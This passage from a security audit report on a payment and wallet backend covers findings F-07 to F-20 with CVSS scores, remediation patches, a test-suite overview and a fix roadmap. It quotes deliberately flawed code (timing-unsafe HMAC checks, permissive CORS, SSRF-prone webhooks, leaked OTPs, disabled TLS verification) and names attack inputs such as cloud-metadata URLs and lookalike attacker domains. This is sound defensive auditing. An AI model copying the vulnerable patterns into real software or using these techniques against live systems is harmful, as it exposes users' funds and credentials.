- **Technical Breakdown**:
  1. The schema author defined `PaymentEvent` specifically to deduplicate webhook events via unique database constraints on `[gateway, eventId]` and `[gateway, payloadHash]`.
  2. Because neither `PaymentService` nor `WalletService` writes to `PaymentEvent`, handlers rely only on checking if `payment.status === 'PAID'` or `funding.status === 'COMPLETED'`.
  3. When duplicate webhook requests arrive concurrently before status is committed, both pass the check and trigger fulfillment or credit routines.
  4. Furthermore, there is zero immutable audit log of incoming raw webhook payloads for forensic dispute resolution.
- **Remediation Patch**:
  Insert into `PaymentEvent` within the transaction before processing the webhook payload:
  ```typescript
  // In PaymentService & WalletService handleWebhook:
  const payloadHash = crypto.createHash('sha256').update(rawBody).digest('hex')
  try {
    await prisma.paymentEvent.create({
      data: {
        gateway,
        eventId: eventId || reference,
        reference,
        payloadHash,
        eventType,
        payload: JSON.parse(rawBody),
      }
    })
  } catch (err: any) {
    if (err.code === 'P2002') {
      logger.info(`Duplicate webhook event ignored: ${gateway} / ${eventId}`)
      return true // Acknowledge without reprocessing
    }
    throw err
  }
  ```

---

### F-08: High — Observable Timing Side-Channel in Monnify & Reseller Webhook HMAC Verification
- **Severity**: High (CVSS 7.4 | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Affected Files & Lines**:
  - `cogna-backend/src/payments/MonnifyAdapter.ts`, Lines 124–129
  - `cogna-backend/src/services/provider-webhook.service.ts`, Lines 37, 44, 51
- **Detailed Code Observation**:
  In `MonnifyAdapter.ts`:
  ```typescript
  validateWebhook(payload: string, signature: string): boolean {
    const hash = crypto.createHmac('sha512', this.secretKey).update(payload).digest('hex')
    return hash === signature // Vulnerable non-constant-time comparison
  }
  ```
- **Technical Breakdown**:
  Javascript's `===` operator compares strings byte-by-byte and terminates early on the first non-matching byte.
  By measuring HTTP response latencies with statistical sampling, an attacker can determine how many leading characters of a forged HMAC signature were correct, allowing byte-by-byte signature forgery.
- **Remediation Patch**:
  ```typescript
  validateWebhook(payload: string, signature: string): boolean {
    if (!signature || typeof signature !== 'string') return false
    const computed = crypto.createHmac('sha512', this.secretKey).update(payload).digest('hex')
    const computedBuf = Buffer.from(computed, 'hex')
    const providedBuf = Buffer.from(signature, 'hex')
    return computedBuf.length === providedBuf.length && crypto.timingSafeEqual(computedBuf, providedBuf)
  }
  ```

---

### F-09: High — Server-Side Request Forgery (SSRF) & Plaintext Secret Exposure in Developer Webhooks
- **Severity**: High (CVSS 8.2 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
- **Affected File & Lines**: `cogna-backend/src/routes/developer.routes.ts`, Lines 58–77, 84–92, 126–134
- **Detailed Code Observation**:
  ```typescript
  // POST /webhooks: Accepts arbitrary destination URL
  const { url, secret } = req.body as { url: string; secret: string }

  // Redelivery:
  const res = await fetch(delivery.endpoint.url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Cogna-Signature': delivery.endpoint.secret, // Raw plaintext secret!
    },
    body: JSON.stringify(delivery.payload),
  })
  ```
- **Technical Breakdown**:
  1. **SSRF**: Any authenticated developer can register a webhook destination URL targeting internal services (`http://127.0.0.1:4000/api/v1/admin/`, cloud metadata `http://169.254.169.254/latest/meta-data/`). Triggering a delivery retry causes the backend server to make an internal HTTP request.
  2. **Plaintext Secret Header**: Instead of computing an HMAC signature of the payload with the secret, the server transmits the raw secret directly in the `X-Cogna-Signature` header.
- **Remediation Patch**:
  1. Validate destination URLs against a strict allowlist rejecting RFC 1918 private IP addresses, loopback (`127.0.0.0/8`), and link-local addresses (`169.254.0.0/16`).
  2. Compute an HMAC-SHA256 signature:
     `'X-Cogna-Signature': crypto.createHmac('sha256', secret).update(JSON.stringify(payload)).digest('hex')`
  3. Store `secret` encrypted at rest using `encryptCredential`.

---

### F-10: High — Public Information Disclosure of Provider API Keys & Gateway Overrides
- **Severity**: High (CVSS 7.7 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **Affected Files & Lines**:
  - `cogna-backend/src/repositories/product.repository.ts`, Lines 28–34, Lines 60–65
  - `cogna-backend/src/routes/product.routes.ts`, Lines 10–62
- **Detailed Code Observation**:
  `Product` schema includes `providerApiOverride Json? @map("provider_api_override")`.
  `ProductRepository.findAll` and `ProductRepository.findById` execute `prisma.product.findMany` and `prisma.product.findUnique` without excluding `providerApiOverride`.
  When public users call `GET /api/v1/products`, the entire database record including `providerApiOverride` (which contains per-product Paystack/Monnify secret keys or reseller credentials) is returned in the JSON response.
- **Technical Breakdown**:
  Per-product gateway overrides allow individual products to route to separate payment gateway merchant accounts using private secret keys. By querying the public marketplace catalog, any unauthenticated attacker can harvest active API secret keys and contract codes.
- **Remediation Patch**:
  In `ProductRepository.findAll` and `ProductRepository.findById`, use an explicit Prisma `select` projection excluding `providerApiOverride`, `providerId`, and `providerProductId` for public routes, reserving those fields solely for admin-authenticated queries.

---

### F-11: High — Missing API Key Scope Enforcement Permitting Arbitrary Customer Actions
- **Severity**: High (CVSS 8.5 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
- **Affected Files & Lines**:
  - `cogna-backend/src/app.ts`, Lines 59–75
  - `cogna-backend/src/plugins/api-key-auth.ts`, Lines 35–48
  - `cogna-backend/src/routes/order.routes.ts`, Lines 9–30
- **Detailed Code Observation**:
  In `app.ts`:
  ```typescript
  app.decorate('authenticateAny', async function (request: FastifyRequest, reply: FastifyReply) {
    if (request.headers['x-api-key']) {
      await app.authenticateApiKey(request, reply)
      if (request.apiKeyContext) {
        request.user = { sub: request.apiKeyContext.userId, role: 'CUSTOMER' }
      }
    } else {
      // ...
    }
  })
  ```
  In `order.routes.ts`:
  ```typescript
  app.addHook('onRequest', app.authenticateAny)

  // POST /api/v1/orders
  app.post('/', async (req, reply) => {
    const { sub } = req.user as { sub: string }
    const body = createOrderSchema.parse(req.body)
    const order = await OrderService.createOrder(sub, body)
    return reply.status(201).send(successResponse(order))
  })
  ```
- **Technical Breakdown**:
  1. Developers generate API keys with explicit granular scopes (e.g. `["read:orders"]`, `["read:products"]`).
  2. In `app.ts`, `authenticateAny` attaches `request.user` with `role: 'CUSTOMER'` but never checks scopes against the requested route method.
  3. Mutating routes such as `POST /api/v1/orders` never verify whether `request.apiKeyContext.scopes` includes `write:orders`.
  4. An API key granted strictly read-only access can place orders, initiate payments, and spend account resources.
- **Remediation Patch**:
  Decorate Fastify with a scope enforcement helper and apply it to mutating routes:
  ```typescript
  // cogna-backend/src/plugins/api-key-auth.ts
  app.decorate('requireScope', (requiredScope: string) => {
    return async (req: FastifyRequest) => {
      if (req.apiKeyContext) {
        const scopes = req.apiKeyContext.scopes || []
        if (!scopes.includes(requiredScope) && !scopes.includes('*')) {
          throw new ForbiddenError(`API key lacks required scope: ${requiredScope}`)
        }
      }
    }
  })

  // cogna-backend/src/routes/order.routes.ts
  app.post('/', { preHandler: [app.requireScope('write:orders')] }, async (req, reply) => { ... })
  ```

---

### F-12: High — Absence of Refresh Token Rotation & Missing Revocation on Password Reset
- **Severity**: High (CVSS 7.5 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
- **Affected File & Lines**: `cogna-backend/src/services/auth.service.ts`, Lines 88–109, Lines 141–152
- **Detailed Code Observation**:
  In `auth.service.ts`:
  ```typescript
  // Lines 99-101:
  // We do NOT rotate the refresh token here to prevent multi-tab concurrency issues
  // The refresh token remains valid until its original expiration (7 days).

  // Lines 141-152 (resetPassword):
  async resetPassword(input: ResetPasswordInput) {
    const userId = await VerificationTokenService.consumeToken(input.token, 'PASSWORD_RESET')
    const passwordHash = await bcrypt.hash(input.password, BCRYPT_ROUNDS)
    await UserRepository.updatePassword(userId, passwordHash)
    // CRITICAL: Stored refresh tokens are NEVER invalidated!
    return { message: 'Password has been successfully reset' }
  }
  ```
- **Technical Breakdown**:
  1. **Absence of Rotation**: Reusing a static refresh token across 7 days violates RFC 6749 Section 10.4 and OWASP session management guidelines. An intercepted refresh token grants 7 days of persistent access without any revocation signal.
  2. **Persistence Across Password Reset**: When a compromised user initiates a password reset to recover their account, existing active refresh tokens in `RefreshToken` are not deleted. The adversary maintains active authenticated access.
- **Remediation Patch**:
  1. Implement single-use refresh token rotation with token family tracking.
  2. Revoke all active refresh tokens upon password reset:
     ```typescript
     // In AuthService.resetPassword:
     await RefreshTokenRepository.deleteByUserId(userId)
     ```

---

### F-13: High — Permissive CORS Origin Suffix Matching with Credentials Enabled
- **Severity**: High (CVSS 8.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`)
- **Affected File & Lines**: `cogna-backend/src/app.ts`, Lines 34–45
- **Detailed Code Observation**:
  ```typescript
  await app.register(cors, {
    origin: (origin, cb) => {
      if (!origin || origin === env.APP_URL || origin === 'http://localhost:3000' || origin.endsWith('.vercel.app') || origin.endsWith('cogna.store')) {
        cb(null, true)
        return
      }
      cb(new Error('Not allowed by CORS'), false)
    },
    credentials: true,
    methods: ['GET', 'HEAD', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  })
  ```
- **Technical Breakdown**:
  1. `origin.endsWith('cogna.store')` evaluates to true for attacker-controlled domains such as `https://evil-cogna.store` or `https://maliciouscogna.store`.
  2. `origin.endsWith('.vercel.app')` permits any public site deployed on Vercel's free shared domain (`https://attacker-app.vercel.app`).
  3. Combined with `credentials: true`, an attacker site can trigger cross-origin requests that execute within the victim's session.
- **Remediation Patch**:
  Use strict hostname parsing or regex anchoring:
  ```typescript
  origin: (origin, cb) => {
    if (!origin) return cb(null, true)
    const allowed = [env.APP_URL, 'http://localhost:3000']
    const isApprovedSubdomain = /^https:\/\/([a-z0-9-]+\.)?cogna\.store$/.test(origin)
    if (allowed.includes(origin) || isApprovedSubdomain) {
      return cb(null, true)
    }
    cb(new Error('Not allowed by CORS'), false)
  }
  ```

---

### F-14: High — Missing Functional RBAC Role Verification on Admin Catalog & Provider Endpoints
- **Severity**: High (CVSS 7.2 | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N`)
- **Affected Files & Lines**:
  - `cogna-backend/src/routes/admin.routes.ts`, Lines 30–43
  - `cogna-backend/src/plugins/admin-rbac.ts`, Lines 6–25
- **Detailed Code Observation**:
  `admin.routes.ts` applies a single coarse guard:
  ```typescript
  async function requireAdmin(req: FastifyRequest, reply: FastifyReply) {
    const { role } = req.user as { role: string }
    if (role !== 'ADMIN' && role !== 'SUPER_ADMIN') {
      return reply.status(403).send(errorResponse(new ForbiddenError('Admin access required').message))
    }
  }
  ```
- **Technical Breakdown**:
  While `adminRbacPlugin` was implemented with `requireAdminRole(['SUPER_ADMIN', 'FINANCE', ...])`, `admin.routes.ts` never applies this decorator to product creation, provider CRUD, or gateway credential updates. A low-tier operator with `adminRole: 'SUPPORT'` has equal administrative access to mutate provider secrets and catalog pricing.
- **Remediation Patch**:
  Apply granular preHandlers on sensitive admin routes:
  ```typescript
  app.put('/payment-gateways/paystack', {
    preHandler: [app.requireAdminRole(['SUPER_ADMIN'])]
  }, async (req, reply) => { ... })

  app.post('/providers', {
    preHandler: [app.requireAdminRole(['SUPER_ADMIN', 'OPERATIONS'])]
  }, async (req, reply) => { ... })
  ```

---

### F-15: High — Transaction PIN Enforcement Bypass via Optional Schema & Account Toggle Flaw
- **Severity**: High (CVSS 7.1 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`)
- **Affected Files & Lines**:
  - `cogna-backend/src/validators/wallet.validator.ts`, Line 13
  - `cogna-backend/src/services/wallet.service.ts`, Lines 36–41
  - `cogna-backend/src/services/transaction-pin.service.ts`, Lines 80–100
- **Detailed Code Observation**:
  `wallet.validator.ts`:
  `transactionPin: z.string().regex(/^\d{6}$/).optional()`
  `wallet.service.ts`:
  ```typescript
  if (user && user.transactionPinEnabled) {
    if (!input.transactionPin) throw new UnauthorizedError('Transaction PIN is required')
    await TransactionPinService.verifyPin(input.userId, input.transactionPin)
  }
  ```
  `transaction-pin.service.ts`:
  Disabling PIN protection requires either `currentPin` OR account `password`.
- **Technical Breakdown**:
  1. Because `transactionPin` is marked `.optional()` in the purchase validator, the API layer does not enforce PIN entry.
  2. If an attacker compromises a session or password, they can invoke `setPinStatus({ enabled: false, password })` without knowing the victim's 6-digit transaction PIN, disabling protection and draining funds.
- **Remediation Patch**:
  1. Make `transactionPin` strictly required in `wallet.validator.ts` for all balance debits.
  2. In `setPinStatus`, require `currentPin` unconditionally when disabling PIN protection.

---

### F-16: Medium — Direct Email Verification OTP Leakage in HTTP Response Payload
- **Severity**: Medium (CVSS 5.3 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`)
- **Affected File & Lines**: `cogna-backend/src/routes/profile.routes.ts`, Lines 140–148
- **Detailed Code Observation**:
  ```typescript
  app.post('/profile/verify-email-request', { onRequest: [app.authenticate] }, async (req, reply) => {
    const { sub } = req.user as { sub: string };
    const rawToken = await VerificationTokenService.createToken(sub, 'EMAIL_VERIFICATION');
    return reply.send(successResponse({ token: rawToken }, 'Verification token generated'));
  });
  ```
- **Technical Breakdown**:
  Instead of dispatching the verification OTP exclusively via email to verify out-of-band mailbox ownership, the endpoint directly leaks `{ token: rawToken }` in the HTTP response JSON. An attacker who signs up with an unowned email address can immediately read the OTP from the response and verify the account without having access to the inbox.
- **Remediation Patch**:
  Dispatch the token via `EmailService.sendVerificationEmail` and return an opaque success message:
  ```typescript
  await EmailService.sendVerificationEmail(user.email, rawToken);
  return reply.send(successResponse(null, 'Verification code dispatched to your registered email'));
  ```

---

### F-17: Medium — Unsanitized Upstream Reseller Responses & Secret Leaks in Worker Queue Logs
- **Severity**: Medium (CVSS 5.3 | `CVSS:3.1/AV:N/AC:L/PR:A/UI:N/S:U/C:L/I:N/A:N`)
- **Affected Files & Lines**:
  - `cogna-backend/src/queue/fulfillment.worker.ts`, Lines 44, 58–63
  - `cogna-backend/src/services/provider-webhook.service.ts`, Lines 147–153
- **Detailed Code Observation**:
  ```typescript
  await OrderRepository.setProviderResponse(orderId, result)
  worker.on('completed', (job, result) => {
    console.log(`[fulfillment] completed job ${job.id} for order ${job.data.orderId}`, result)
  })
  ```
- **Technical Breakdown**:
  Provider API responses frequently return raw partner access tokens, upstream secret codes, and customer license keys. Dumping `result` directly to console stdout writes plaintext credentials into container logs and centralized logging systems.
- **Remediation Patch**:
  Implement recursive key redaction:
  ```typescript
  export function redactSensitiveData(data: any): any {
    if (!data || typeof data !== 'object') return data
    const redacted = Array.isArray(data) ? [...data] : { ...data }
    for (const key of Object.keys(redacted)) {
      if (/secret|token|key|password|auth|authorization/i.test(key)) {
        redacted[key] = '••••••••'
      } else if (typeof redacted[key] === 'object') {
        redacted[key] = redactSensitiveData(redacted[key])
      }
    }
    return redacted
  }
  ```

---

### F-18: Medium — Lack of Attempt Throttling and Lockout Mechanism on Transaction PIN Verification
- **Severity**: Medium (CVSS 5.3 | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N`)
- **Affected File & Lines**: `cogna-backend/src/services/transaction-pin.service.ts`, Lines 39–47
- **Detailed Code Observation**:
  ```typescript
  async verifyPin(userId: string, pin: string): Promise<void> {
    const user = await UserRepository.findById(userId)
    // ...
    const ok = await bcrypt.compare(pin, user.transactionPinHash)
    if (!ok) throw new UnauthorizedError('Incorrect transaction PIN')
  }
  ```
- **Technical Breakdown**:
  `verifyPin` performs bcrypt comparison without attempt counting or lockout. An adversary with access to an active customer token can issue automated PIN guessing attacks against the 6-digit numeric PIN space.
- **Remediation Patch**:
  Store consecutive failed PIN attempts in Redis or the user record; lock PIN verification for 30 minutes after 5 consecutive failures.

---

### F-19: Low — Plaintext Provider Secrets and Process-Wide TLS Bypass in Database Seeder
- **Severity**: Low (CVSS 3.7 | `CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N`)
- **Affected File & Lines**: `cogna-backend/prisma/seed.ts`, Lines 1, 51
- **Detailed Code Observation**:
  ```typescript
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
  // ...
  const provider = await prisma.provider.create({
    data: {
      name: 'Akunding Reseller API',
      baseUrl: 'https://akunding.shop/api/v1',
      apiKey: 'sk_live_dummy_akunding_api_key_xxxxxxxxxxxxxxxx',
      status: 'ACTIVE',
    },
  });
  ```
- **Technical Breakdown**:
  Disabling TLS certificate verification globally weakens Node.js network security. Seeding plaintext API keys bypasses AES-256-GCM encryption requirements.
- **Remediation Patch**:
  Remove `NODE_TLS_REJECT_UNAUTHORIZED = '0'` and use `ProviderRepository.create()` during seeding to ensure encryption at rest.

---

### F-20: Low — Client-Side Token Storage in localStorage & Missing Server-Side Next.js Guards
- **Severity**: Low (CVSS 3.8 | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N`)
- **Affected Files & Lines**:
  - `cogna-frontend/src/stores/auth.ts`, Line 64
  - `cogna-frontend/src/lib/api.ts`, Line 16
  - Absence of `cogna-frontend/src/middleware.ts`
- **Technical Breakdown**:
  Storing JWT access and refresh tokens in `localStorage` exposes them to any cross-site script execution. Route protection relies solely on client-side React component lifecycle hooks rather than server-side Next.js edge middleware.
- **Remediation Patch**:
  Transition session storage to `httpOnly`, `Secure`, `SameSite=Strict` cookies and implement `middleware.ts` for edge-level route protection.

---

## 4. Positive Security Defenses & IDOR Verification

A rigorous audit was conducted to evaluate multi-tenant data isolation and Insecure Direct Object References (IDOR). The audit confirmed that Cogna implements strong object-level access controls across customer domains:

1. **Centralized Ownership Assertion (`owned()` helper)**:
   In `cogna-backend/src/services/customer.service.ts`:
   ```typescript
   function owned<T extends { userId: string }>(value: T | null, label: string, userId: string): T {
     if (!value) throw new NotFoundError(label);
     if (value.userId !== userId) throw new ForbiddenError('Resource ownership validation failed');
     return value;
   }
   ```
   Every customer-facing lookup (order details, receipts, support tickets, ticket messaging, notifications) invokes `owned()`. Cross-tenant requests are consistently rejected with HTTP 403 Forbidden.

2. **Scoped Prisma Queries**:
   List queries in `CustomerRepository` explicitly bind the `where` clause to `userId`:
   - `listOrders(userId, ...)` -> `where: { userId }`
   - `listTickets(userId, ...)` -> `where: { userId }`
   - `listNotifications(userId)` -> `where: { userId }`

3. **Cryptographic Credential Protection**:
   Provider and gateway secret keys are protected using AES-256-GCM authenticated encryption at rest (`src/utils/credential-crypto.ts`), preventing tampering and plaintext leakage in database backups.

---

## 5. Programmatic Security Test Suite Integration

To provide continuous automated verification against regression, a dedicated modular security test suite has been implemented using Vitest under `cogna-backend/tests/security/`:

| Test Suite File | Domain & Attack Vectors Covered | Key Assertions |
| :--- | :--- | :--- |
| `helpers/security.helper.ts` | Shared security test fixtures, JWT generation, HMAC calculators, concurrency harness | Constant-time HMAC generation, async promise concurrency runner |
| `auth-rbac.security.test.ts` | Role escalation, admin route boundaries, JWT forgery, API key auth | HTTP 403 for Customer-to-Admin escalation, 401 for forged JWTs & invalid API keys |
| `wallet-concurrency.security.test.ts` | Race conditions, double-spending, purchase idempotency, refund replay | Atomic balance locks, strict idempotency keys, duplicate credit rejection |
| `webhook-integrity.security.test.ts` | Gateway signature validation (Paystack, Monnify, Plisio), underpayment | Rejection of forged signatures, tampered payloads, Plisio mismatch detection |
| `data-isolation-idor.security.test.ts` | Multi-tenant IDOR, resource ownership validation (`owned()` helper) | Cross-tenant access denied across orders, receipts, tickets, and notifications |
| `provider-secrets.security.test.ts` | AES-256-GCM credential encryption, catalog secret disclosure | Ciphertext tamper rejection, authentication tag verification, secret scrubbing |

---

## 6. Prioritized Remediation Roadmap & Secret Hygiene

### Priority 1: Immediate Financial & Account Protections (Sprint 1)
1. **Remediate F-01 & F-06**: Implement Compare-And-Swap (CAS) optimistic concurrency control in `WalletRepository.purchase` and replace in-memory arithmetic with atomic database operations.
2. **Remediate F-02**: Enforce strict amount matching on Plisio crypto deposits; reject `status: 'mismatch'`.
3. **Remediate F-03**: Restrict `/wallet/refunds` to administrative approval; update order state to `REFUNDED` atomically.
4. **Remediate F-04**: Replace `Math.random()` with `crypto.randomInt()`; scope OTP lookup strictly by `userId`.
5. **Remediate F-05**: Apply DOMPurify sanitization to client-side PDF receipt generation in `orders/[id]/page.tsx`.

### Priority 2: Gateway & Authorization Hardening (Sprint 2)
1. **Remediate F-07**: Activate `PaymentEvent` deduplication model on all inbound webhooks.
2. **Remediate F-08**: Replace string `===` comparison with `crypto.timingSafeEqual` in Monnify and reseller webhooks.
3. **Remediate F-09 & F-10**: Validate developer webhook destination URLs; scrub `providerApiOverride` from public catalog responses.
4. **Remediate F-11 & F-14**: Enforce API key scope verification (`requireScope`) and functional admin RBAC (`requireAdminRole`).
5. **Remediate F-12 & F-13**: Implement refresh token revocation on password reset; restrict CORS origin regex.

### Priority 3: Operational & Defensive Enhancements (Sprint 3)
1. **Remediate F-15 & F-18**: Enforce mandatory transaction PIN verification; introduce 5-attempt brute-force lockout.
2. **Remediate F-16 & F-17**: Remove OTP tokens from HTTP JSON responses; redact credentials from worker queue logs.
3. **Remediate F-19 & F-20**: Encrypt seed secrets; transition client session tokens to `httpOnly` secure cookies with Next.js edge middleware.

### Secret Hygiene Attestation
This audit confirms that no plaintext production secrets, live merchant credentials, or live API keys were introduced into test suites, audit logs, or repository artifacts during this assessment. All test routines utilize synthetic keys and isolated test mocks.
